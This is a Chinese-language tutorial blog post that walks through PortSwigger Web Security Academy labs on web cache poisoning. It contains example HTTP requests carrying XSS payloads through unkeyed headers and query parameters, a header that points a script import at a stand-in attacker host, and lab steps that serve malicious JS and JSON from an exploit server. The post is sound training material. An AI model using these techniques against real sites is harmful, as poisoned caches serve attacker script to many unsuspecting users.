> 原文链接: https://www.anquanke.com//post/id/246452 


# 梨子带你刷burpsuite靶场系列之高级漏洞篇 - Web缓存投毒专题


                                阅读量   
                                **47282**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t0185ebc77586c2741c.jpg)](https://p0.ssl.qhimg.com/t0185ebc77586c2741c.jpg)



## 本系列介绍

> PortSwigger是信息安全从业者必备工具burpsuite的发行商，作为网络空间安全的领导者，他们为信息安全初学者提供了一个在线的网络安全学院(也称练兵场)，在讲解相关漏洞的同时还配套了相关的在线靶场供初学者练习，本系列旨在以梨子这个初学者视角出发对学习该学院内容及靶场练习进行全程记录并为其他初学者提供学习参考，希望能对初学者们有所帮助。



## 梨子有话说

> 梨子也算是Web安全初学者，所以本系列文章中难免出现各种各样的低级错误，还请各位见谅，梨子创作本系列文章的初衷是觉得现在大部分的材料对漏洞原理的讲解都是模棱两可的，很多初学者看了很久依然是一知半解的，故希望本系列能够帮助初学者快速地掌握漏洞原理。



## 高级漏洞篇介绍

> 相对于服务器端漏洞篇和客户端漏洞篇，高级漏洞篇需要更深入的知识以及更复杂的利用手段，该篇也是梨子的全程学习记录，力求把漏洞原理及利用等讲的通俗易懂。



## 高级漏洞篇 – Web缓存投毒专题

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFWeb%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%EF%BC%9F"></a>什么是Web缓存投毒？

首先了解一下什么是Web缓存，Web缓存就是服务器会先将之前没见过的请求对应的响应缓存下来，然后当有认为是相同请求的时候直接将缓存发给用户，这样可以减轻服务器的负荷。但是服务器端在识别的时候是根据特征来的，如果两个请求的特征相同即会认为是相同的请求，此时如果攻击者首先触发服务器缓存附有恶意payload的响应，当其他用户发送相同请求时即会接收到这个恶意的响应。从影响范围来看，一旦成功缓存被投毒的响应，会影响到大量的用户，比起以往某些只能针对某个用户发起的攻击，危害大很多很多。

### <a class="reference-link" name="Web%E7%BC%93%E5%AD%98%E7%9A%84%E6%B5%81%E7%A8%8B%E6%98%AF%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%EF%BC%9F"></a>Web缓存的流程是什么样的？

其实前面梨子已经讲了差不多了，这一小节主要是补充讲解。其实这个Web缓存不是永久的，它只保存固定的一段时间，过了这个时间以后就会重新生成缓存，所以这类攻击还是有一定难度的。那么服务器端怎么识别等效的请求呢，我们接下来介绍一下缓存键的概念。

### <a class="reference-link" name="%E7%BC%93%E5%AD%98%E9%94%AE"></a>缓存键

缓存键就是服务器端用来识别等效请求的一系列特征的统称。一般缓存键包括请求行和Host头。服务器端只识别设置为缓存键的特征是否相同，这也就导致了Web缓存投毒漏洞的产生。



## 如何构造Web缓存投毒攻击？

一般构造Web缓存投毒攻击需要以下几个步骤
- 识别并确认不会被缓存的输入
- 从服务器诱发被投毒的响应
- 得到被缓存的响应
### <a class="reference-link" name="%E8%AF%86%E5%88%AB%E5%B9%B6%E7%A1%AE%E8%AE%A4%E4%B8%8D%E4%BC%9A%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E8%BE%93%E5%85%A5"></a>识别并确认不会被缓存的输入

我们想要构造Web缓存投毒就需要我们的输入能够反馈在响应中，但是如果我们的输入被设置为缓存键，那就不可能有用户发出等效请求，所以我们需要不断调试直到找到我们的输入既不会是缓存键又可以被反馈在被缓存的响应中。这样才能保证被投毒的响应缓存被投放到受害者那里，burp推荐了一款插件Param Miner来辅助我们寻找这样的不会被缓存的字段。

<a class="reference-link" name="Param%20Miner"></a>**Param Miner**

这款插件会自动去检测不会被缓存的字段使用方法很简单，只需要右键选择Guess headers即可。并且为了不给真实用户造成困扰，可以开启cache buster(缓存粉碎机)。

### <a class="reference-link" name="%E4%BB%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B1%E5%8F%91%E8%A2%AB%E6%8A%95%E6%AF%92%E7%9A%84%E5%93%8D%E5%BA%94"></a>从服务器诱发被投毒的响应

我们确认了不会被缓存的输入以后，我们就要看服务端是如何处理这个输入的，如果可以动态反馈到响应中，就是我们能够发动Web缓存投毒的关键。

### <a class="reference-link" name="%E5%BE%97%E5%88%B0%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E5%93%8D%E5%BA%94"></a>得到被缓存的响应

我们的输入可以被反馈到响应中还不够，还得能够生成缓存，这样才可以真正地将恶意payload落地。所以我们为此还是要不断调试才能成功找到生成投毒缓存的操作。



## 基于缓存设计缺陷的Web缓存投毒攻击

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%8F%91%E5%8A%A8XSS%E6%94%BB%E5%87%BB"></a>使用Web缓存投毒发动XSS攻击

因为XSS攻击也是有一部分是输入被反馈在响应中，所以Web缓存投毒当然也可以用来发动XSS攻击。我们关注这样一对请求和响应

```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
&lt;meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" /&gt;

```

我们观察到X-Forwarded-Host指定的URL会代替Host的值被反馈在响应中，并且X-Forwarded-Host是不会被缓存的字段，但是Host和请求行是缓存键。所以所有Host为innocent-website.com的用户请求/en?region=uk都会接收到被投毒的响应，像这样

```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."&gt;&lt;script&gt;alert(1)&lt;/script&gt;"

HTTP/1.1 200 OK
Cache-Control: public
&lt;meta property="og:image" content="https://a."&gt;&lt;script&gt;alert(1)&lt;/script&gt;"/cms/social.png" /&gt;

```

当然了，alert只是弹窗验证而已，攻击者可以构造更复杂的XSS payload获取更多的东西。

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%8F%91%E5%8A%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E8%B5%84%E6%BA%90%E5%AF%BC%E5%85%A5"></a>使用Web缓存投毒发动不安全的资源导入

有的应用程序会导入Host指定服务器的某个资源，比如JS资源，但是如果我们像上面一样通过X-Forwarded-Host代替Host进行导入，则可能导入同名但是内容为恶意payload的JS资源，例如

```
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
&lt;script src="https://evil-user.net/static/analytics.js"&gt;&lt;/script&gt;

```

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BD%BF%E7%94%A8%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E5%A4%B4%E7%9A%84Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"></a>配套靶场：使用不被缓存头的Web缓存投毒

首先我们随便设置一个查询参数，然后随便设置一个值，只是为了测试Web缓存

[![](https://p4.ssl.qhimg.com/t01c2e9adc6c465b3eb.png)](https://p4.ssl.qhimg.com/t01c2e9adc6c465b3eb.png)

从上图来看，现在是没有产生Web缓存的，然后我们插入到X-Forwarded-Host字段会替换掉本应是Host字段的值，这样就相当于resources/js/tracking.js这个文件是可以伪造的，然后我们再go一下看一下缓存之后是什么样子的

[![](https://p5.ssl.qhimg.com/t010e0fadb91a99331d.png)](https://p5.ssl.qhimg.com/t010e0fadb91a99331d.png)

好，我们现在看到Web缓存已经生成了，这样，所有被识别为发出等效请求的用户都会接收到这个响应，就会访问到”中毒”后的网页，模拟结束，现在我们到Exploit Server把payload写入到这个同名文件下

[![](https://p3.ssl.qhimg.com/t011488c395c542b3f0.png)](https://p3.ssl.qhimg.com/t011488c395c542b3f0.png)

然后随便找一个靶场里面的帖子进去，抓包改包，把Exploit Server的域名插到X-Forwarded-Host字段下，然后重放几次让Web缓存生成

[![](https://p0.ssl.qhimg.com/t01e476ade6801269f3.png)](https://p0.ssl.qhimg.com/t01e476ade6801269f3.png)

然后在浏览器访问这个页面，就能实现弹窗了，如果没生效就再缓存一次就行

[![](https://p3.ssl.qhimg.com/t019801ec976a7fa9e2.png)](https://p3.ssl.qhimg.com/t019801ec976a7fa9e2.png)

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98Cookie%E7%9A%84Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"></a>使用不被缓存Cookie的Web缓存投毒

像上面一样，我们观察这样的请求

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
```

我们看到应用程序通过Cookie中的language的值来调整网站的语言，当该请求生成响应后，等效请求的用户收到的就是波兰语(pl)的页面了。当然了，这种攻击方式比较少，因为很容易因为影响到正常用户被发现。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BD%BF%E7%94%A8%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98Cookie%E7%9A%84Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"></a>配套靶场：使用不被缓存Cookie的Web缓存投毒

首先我们观察一下请求与响应的关系

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011bf7c6dc4cd901ef.png)

我们可以看到Cookie中的fehost字段被自动拼接到响应中的script节点下，那么我们可以修改这个字段的值实现XSS攻击

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01167a86c077a61c53.png)

我们可以看到现在Web缓存已经生成了，并且我们修改后的字段值也是直接拼接到响应里，为了防止直接插XSS语句不生效，我们在前后多加了一般的script标签分别把前面后面的script标签闭合掉，从而成功发动XSS

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f164d6054cbba732.png)

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8%E5%A4%9A%E9%87%8D%E5%A4%B4%E5%8F%91%E5%8A%A8Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB"></a>使用多重头发动Web缓存投毒攻击

如果我们想要发动更高级的攻击可以操纵多个请求头来实现，现在我们考虑这样的一个情况，就是应用程序默认是使用HTTPS协议传输的，但是如果我们使用HTTP协议访问会自动触发一个指向Host的重定向，但是我们可以通过X-Forwarded-Host代替Host的值重定向到恶意域，像这样

```
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random

```

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%A4%9A%E9%87%8D%E5%A4%B4%E7%9A%84Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"></a>配套靶场：使用多重头的Web缓存投毒

首先我们还是把HTTP History中的首页的那个包发到Repeater里面，随便加一个X-Forwarded-Host，Go一下，发现并没有什么变化，而且/resources/js/tracking.js变成了相对路径，那么我们再观察一下是相对于谁呢？那么我们就想办法让页面重定向，这就需要X-Forwarded-Scheme字段了，这个字段作用和X-Forwarded-Proto的效果是一样的，如果请求方法是这个方法指定的则会重定向到用HTTPS请求主机名

[![](https://p2.ssl.qhimg.com/t016f2879c8095f5d74.png)](https://p2.ssl.qhimg.com/t016f2879c8095f5d74.png)

我们发现当同时有X-Forwarded-Host和X-Forwarded-Scheme两个字段的时候，就会有组合效果，因为请求方法为HTTP，则会重定向HTTPS流去请求主机名，然后这时候我们已经将主机名转为我们指定的主机名，这样它的相对路径就可以生效了，我们先去Exploit Server构造Payload

[![](https://p0.ssl.qhimg.com/t01199abd8b11bdb81c.png)](https://p0.ssl.qhimg.com/t01199abd8b11bdb81c.png)

然后我们在Repeater里面抓包改包，让服务器产生Web缓存

[![](https://p3.ssl.qhimg.com/t0180c5eb5747c62cfc.png)](https://p3.ssl.qhimg.com/t0180c5eb5747c62cfc.png)

我们可以看到重定向成功了，会跳转到Exploit Server下的/resources/js/tracking.js

[![](https://p1.ssl.qhimg.com/t014460e91ee81fd788.png)](https://p1.ssl.qhimg.com/t014460e91ee81fd788.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%9A%B4%E9%9C%B2%E5%A4%A7%E9%87%8F%E4%BF%A1%E6%81%AF%E7%9A%84%E5%93%8D%E5%BA%94"></a>利用暴露大量信息的响应

有时，网站会泄露大量有关自身及其行为的信息，从而使自己更容易遭受Web缓存投毒攻击。 ### Cache-control指令 有的时候响应会暴露缓存有效期等敏感信息，例如

```
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
```

有效期可以帮助我们去计算时间从而达到某种恶意目的。 ### Vary头 Vary头指定了一些可以被视为缓存键的字段列表，常见的如User-Agent头，应用程序通过其可以仅向指定用户群投放响应，也可以利用这个特点向特定用户群发动Web缓存投毒攻击。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BD%BF%E7%94%A8%E6%9C%AA%E7%9F%A5%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%9A%84%E5%AE%9A%E5%90%91Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"></a>配套靶场：使用未知请求头的定向Web缓存投毒

找到隐藏字段X-Host，然后像之前那样生成Web缓存，直接放生成缓存的结果

[![](https://p2.ssl.qhimg.com/t01318ca8d17eccabb2.png)](https://p2.ssl.qhimg.com/t01318ca8d17eccabb2.png)

然后我们发现与之前的不同是User-Agent也是缓存键，所以我们还要去留言板钓他们的User-Agent

[![](https://p4.ssl.qhimg.com/t01aa181eb03702b2bc.png)](https://p4.ssl.qhimg.com/t01aa181eb03702b2bc.png)

进到Exploit Server查收钓到的User-Agent，然后再结合刚才的那个生成新的Web缓存

[![](https://p2.ssl.qhimg.com/t01faa718e3d03d11d3.png)](https://p2.ssl.qhimg.com/t01faa718e3d03d11d3.png)

[![](https://p5.ssl.qhimg.com/t015cf66d1b488fc8b9.png)](https://p5.ssl.qhimg.com/t015cf66d1b488fc8b9.png)

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%8F%91%E5%8A%A8%E5%9F%BA%E4%BA%8EDOM%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"></a>使用Web缓存投毒发动基于DOM的漏洞攻击

不仅可以通过Web缓存投毒导入恶意JS文件，还可以导入恶意的JSON字符串，例如<br>``{`"someProperty" : "&lt;svg onload=alert(1)&gt;"`}``<br>
如果这条payload被传递到恶意的sink就可能触发基于DOM的漏洞，如果想要让网站加载恶意JSON就需要CORS授权允许跨站，例如

```
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *

`{`
    "malicious json" : "malicious json"
`}`

```

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%9C%A8%E4%B8%A5%E6%A0%BC%E5%8F%AF%E7%BC%93%E5%AD%98%E6%80%A7%E6%A0%87%E5%87%86%E4%B8%8B%E4%BD%BF%E7%94%A8Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%8F%91%E5%8A%A8%E5%9F%BA%E4%BA%8EDOM%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"></a>配套靶场：在严格可缓存性标准下使用Web缓存投毒发动基于DOM的漏洞攻击

首先我们还是，默认使用Param Miner扫到可伪造字段X-Forwarded-Host。然后我们把首页放到Repeater里看一下有没有什么新东西

[![](https://p5.ssl.qhimg.com/t01b8f4b8dc4c5c1909.png)](https://p5.ssl.qhimg.com/t01b8f4b8dc4c5c1909.png)

[![](https://p3.ssl.qhimg.com/t01c169043b885e55bf.png)](https://p3.ssl.qhimg.com/t01c169043b885e55bf.png)

[![](https://p2.ssl.qhimg.com/t018e2bb9ca3279578d.png)](https://p2.ssl.qhimg.com/t018e2bb9ca3279578d.png)

这些应该都是json的东西，大概的行为就是以data.host下的/resources/json/geolocate.json为参数执行initGeoLocate函数，然后我们再追踪一下这个geolocate.js和geolocate.json

[![](https://p4.ssl.qhimg.com/t01f12a5bc9c9d8c68d.png)](https://p4.ssl.qhimg.com/t01f12a5bc9c9d8c68d.png)

从图上来看，geolocate.js会把j.country变量直接拼接进来，所以我们看一下这个country变量在哪，应该是在geolocate.json文件里面

[![](https://p1.ssl.qhimg.com/t01e9e913ec09cf48bc.png)](https://p1.ssl.qhimg.com/t01e9e913ec09cf48bc.png)

那么我们就需要在Exploit Server中伪造属于我们的geolocate.json文件，只是country的值换成xss语句

[![](https://p2.ssl.qhimg.com/t013d2398b184ccdd88.png)](https://p2.ssl.qhimg.com/t013d2398b184ccdd88.png)

好的，然后我们就可以生成Web缓存了

[![](https://p3.ssl.qhimg.com/t01f2b50980294aae00.png)](https://p3.ssl.qhimg.com/t01f2b50980294aae00.png)

刷新首页成功加载我们自己的geolocate.json

[![](https://p1.ssl.qhimg.com/t018ccc7397b4ecd0cf.png)](https://p1.ssl.qhimg.com/t018ccc7397b4ecd0cf.png)

注：扫到字段以后要把Param Miner的cachebuster都关了，不然永远也不会生成缓存

### <a class="reference-link" name="Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E9%93%BE"></a>Web缓存投毒链

如果将我们学过的几种漏洞与Web缓存投毒结合起来，可以发动更高级的攻击。下面我们直接通过一道靶场来深入理解。

### <a class="reference-link" name="Web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E9%93%BE"></a>Web缓存投毒链

我们识别到两个可用来投毒的字段：X-Forwarded-Host、X-Original-URL，然后分析一下/resources/js/translations.js这个文件，看一下initTranslations()这个函数是怎么运作的

[![](https://p3.ssl.qhimg.com/t01aa08c8172419c752.png)](https://p3.ssl.qhimg.com/t01aa08c8172419c752.png)

首先我们来看一下提取现在网页的语言的函数

[![](https://p0.ssl.qhimg.com/t014426a6a2cabecdea.png)](https://p0.ssl.qhimg.com/t014426a6a2cabecdea.png)

大概是这么一个流程，然后是翻译函数，因为只翻译首页，所以所谓的翻译就是一对一的替换，然后我们留意一下红框部分，就是说除了英语其他的都会执行翻译，也就是说除了英语以外的我们都能用来插入DOM-XSS语句，考虑到乱码问题，我们选择en-gb这个，虽然也是英语，但是因为代码里严格匹配en，所以这个也是可以用来插入的，而且也不用考虑乱码的问题，现在我们去Exploit Server写入DOM-XSS语句进去

[![](https://p4.ssl.qhimg.com/t0184c08295d2c49dbd.png)](https://p4.ssl.qhimg.com/t0184c08295d2c49dbd.png)

然后我们需要抓取/?localized=1这个包，因为你选择翻译的时候会请求这个页面，然后修改X-Forwarded-Host字段为Exploit Server的，并产生Web缓存

[![](https://p0.ssl.qhimg.com/t0199c1e291163a68f0.png)](https://p0.ssl.qhimg.com/t0199c1e291163a68f0.png)

但是这是翻译页面，我们要怎样才能让用户首先进到的就是我们的翻译页面呢，那就是在首页加入一个X-Original-URL字段指向翻译页面，这样访问首页的人就都会被重定向到这个页面了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01dd255a6970220d11.png)

因为需要生成两个Web缓存并且需要在靶场访问的时候同时在生效中，所以需要多试几次

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01dcb71578afd4840c.png)



## 基于缓存实现缺陷的Web缓存投毒攻击

### <a class="reference-link" name="%E7%BC%93%E5%AD%98%E9%94%AE%E7%BC%BA%E9%99%B7"></a>缓存键缺陷

传统的攻击经常通过将payload注入查询字符串实现，但是请求行是缓存键，这就导致不可能会有用户发出等效请求，也就接收不到投毒响应缓存，但是如果有CDN的话，他们会将缓存键内容进行某些处理之后再存入缓存，例如
- 排除查询字符串
- 过滤掉特定的查询参数
- 规范缓存键中的输入
尤其是前两条，即使我们注入payload到查询字符串或参数中，用户也可能收到被投毒的响应缓存。

### <a class="reference-link" name="%E8%AF%86%E5%88%AB%E5%90%88%E9%80%82%E7%9A%84%E7%BC%93%E5%AD%98%E6%96%AD%E8%A8%80"></a>识别合适的缓存断言

首先我们要识别合适的缓存断言以测试缓存的过程。我们需要知道我们接收到的响应是来自缓存还是服务器，比如从以下地方可以得到反馈
- 可准确告知是否为缓存的HTTP头
- 动态的可观察变化的内容
- 不同的响应时间
有的时候应用程序会使用第三方的缓存组件，此时可以通过查阅相关文档的方式得知缓存的过程。例如，基于Akamai的网站可能支持Pragma：akamai-x-get-cache-key，它可以在响应标头中显示缓存键。

```
GET /?param=1 HTTP/1.1
Host: innocent-website.com
Pragma: akamai-x-get-cache-key

HTTP/1.1 200 OK
X-Cache-Key: innocent-website.com/?param=1

```

### <a class="reference-link" name="%E6%8E%A2%E6%B5%8B%E7%BC%93%E5%AD%98%E9%94%AE%E7%9A%84%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B"></a>探测缓存键的处理过程

我们应该还要观察缓存是否对缓存键有其他的处理。比如剔除Host中的端口号等。下面我们来关注这样一对请求和响应。它会动态将Host值拼接到Location中

```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss

```

然后我们在Host中随便加入一个端口，观察一下响应

```
GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss

```

我们再去掉端口号重新发送请求

```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: hit

```

发现已经生成缓存，但是缓存是我们加了端口号发出时的响应版本。这就说明端口号是不会加入缓存键中的。

### <a class="reference-link" name="%E8%AF%86%E5%88%AB%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"></a>识别可利用的漏洞

讲了这么多，其实Web缓存投毒的危害程度完全取决于其能够用来发动的攻击，常见的有像反射型XSS、开放重定向等客户端漏洞。并且Web缓存投毒不需要用户点击任何链接，可能在发出正常的请求时也会接收到被投毒的响应缓存。

### <a class="reference-link" name="%E7%BC%93%E5%AD%98%E9%94%AE%E7%BC%BA%E9%99%B7%E7%9A%84%E5%88%A9%E7%94%A8"></a>缓存键缺陷的利用

<a class="reference-link" name="%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%8F%B7"></a>**不被缓存的端口号**

前面我们介绍过，缓存键有时候可能不会只会缓存域名或主机名而不缓存端口号。所以我们可以利用这个特点发动如DDOS(向任意端口号发出大量请求)、XSS(在端口号位置插入payload)等攻击。

**<a class="reference-link" name="%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%AD%97%E7%AC%A6%E4%B8%B2"></a>不被缓存的查询字符串**

<a class="reference-link" name="%E6%8E%A2%E6%B5%8B%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%AD%97%E7%AC%A6%E4%B8%B2"></a>**探测不被缓存的查询字符串**

有的应用程序并不会在响应中告知是否产生缓存。而且如果查询字符串不是缓存键的话，即使不同的查询字符串也会得到相同的响应缓存。那么我们可以在其他请求头中下手，例如加在Accept-Encoding字段中

```
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```

其实也可以在Param Miner开启动态的缓存粉碎机(cachebuster)。还有一种办法就是修改不同的路径，但是仍然可以的到相同的响应缓存。例如

```
Apache: GET //
Nginx: GET /%2F
PHP: GET /index.php/xyz
.NET GET /(A(xyz)/
```

<a class="reference-link" name="%E5%88%A9%E7%94%A8%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%AD%97%E7%AC%A6%E4%B8%B2"></a>**利用不被缓存的查询字符串**

查询字符串不会被缓存可能会扩大XSS攻击面，因为附有XSS payload的查询字符串的请求在缓存看来与普通请求无异。但是普通用户可能就会接收到被投毒的响应缓存。

<a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E9%80%9A%E8%BF%87%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84Web%E7%BC%93%E5%AD%98%E5%93%8D%E5%BA%94"></a>**配套靶场：通过不被缓存的查询字符串的Web缓存响应**

这一关考察就是常规的web缓存投毒，这一关并没有对查询字符串进行绑定，所以同一个路径下即识别为等效页面即投放缓存，那么我们直接在URL里面投毒

[![](https://p3.ssl.qhimg.com/t017e4b35614cfc8429.png)](https://p3.ssl.qhimg.com/t017e4b35614cfc8429.png)

响应中的Age字段可以告诉我们它的缓存已经生效多长时间了，这一关设定的是35秒后重新缓存，可以作为我们投毒的一个信号标，于是我们看一下这时候访问根目录的响应是怎样的

[![](https://p5.ssl.qhimg.com/t01fb5c6b7be75ba353.png)](https://p5.ssl.qhimg.com/t01fb5c6b7be75ba353.png)

我们得到的就是投毒后的缓存，这时访问首页的人都会接收到投毒的缓存

[![](https://p4.ssl.qhimg.com/t019db8d1c779d07f74.png)](https://p4.ssl.qhimg.com/t019db8d1c779d07f74.png)

<a class="reference-link" name="%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%8F%82%E6%95%B0"></a>**不被缓存的查询参数**

有的时候缓存仅将某几个查询参数排除在缓存键中，例如utm_content 等utm参数。但是这种攻击方式会因为参数不太会被专门处理而没有那么大的危害。但是如果有功能点可以处理整个URL则可能会有转机。

**<a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E9%80%9A%E8%BF%87%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%8F%82%E6%95%B0%E7%9A%84Web%E7%BC%93%E5%AD%98%E5%93%8D%E5%BA%94"></a>配套靶场：通过不被缓存的查询参数的Web缓存响应**

这一关考点是它只有某些查询参数不会作为缓存键，我们扫到utm_content这个查询参数不是缓存键，所以我们可以用这个参数实现Web缓存投毒

[![](https://p0.ssl.qhimg.com/t01e7622e456f6e7a6e.png)](https://p0.ssl.qhimg.com/t01e7622e456f6e7a6e.png)

等到重新生成Web缓存的时候，成功通关

[![](https://p5.ssl.qhimg.com/t0172d5b9208b1a1810.png)](https://p5.ssl.qhimg.com/t0172d5b9208b1a1810.png)

**<a class="reference-link" name="%E7%BC%93%E5%AD%98%E5%8F%82%E6%95%B0%E9%9A%90%E8%97%8F"></a>缓存参数隐藏**

有的时候因为解析差异，可以将某些本来是缓存键的查询参数隐藏到非缓存键中。例如查询字符串中通过与(&amp;)区分各个参数，通过问号(?)识别查询参数的开始。但是如果有多个问号，就会以第一个问号作为查询参数的开始，例如<br>`GET /?example=123?excluded_param=bad-stuff-here`<br>
这时，excluded_param就不会被作为缓存键处理。

<a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82"></a>**利用参数解析差异**

有的应用程序有一些特殊的查询参数解析规则，比如Ruby on Rails框架将与(&amp;)和分号 (;)作为参数分隔符。但是如果缓存不支持这样解析参数，就会造成差异。例如<br>`GET /?keyed_param=abc&amp;excluded_param=123;keyed_param=bad-stuff-here`<br>
如上所示，keyed_param就会被视为缓存键，而excluded_param不会，而且只会被缓存解析成两个参数

```
keyed_param=abc
excluded_param=123;keyed_param=bad-stuff-here
```

而被Ruby on Rails解析成三个参数

```
keyed_param=abc
excluded_param=123
keyed_param=bad-stuff-here
```

此时keyed_param的值就会被覆盖为bad-stuff-here，也会得到由这个值生成的响应，但是在缓存看来只要该参数值为abc的都会被视为该响应的等效请求。利用这种特点可以发动JSONP攻击，它会将回调函数名附在查询参数中，例如<br>`GET /jsonp?callback=innocentFunction`<br>
我们可以利用上面的特点替换成我们指定的函数名。

